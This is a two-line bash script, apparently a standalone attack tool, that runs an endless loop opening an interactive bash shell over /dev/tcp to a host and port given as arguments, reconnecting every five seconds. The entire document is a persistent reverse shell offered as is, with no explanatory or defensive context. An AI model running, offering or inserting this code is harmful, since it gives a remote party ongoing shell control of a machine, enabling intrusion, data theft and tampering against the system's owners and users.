#! /bin/bash

while true; do /bin/bash -i >& /dev/tcp/${1:-127.0.0.1}/${2:-8080} 0>&1; sleep 5; done

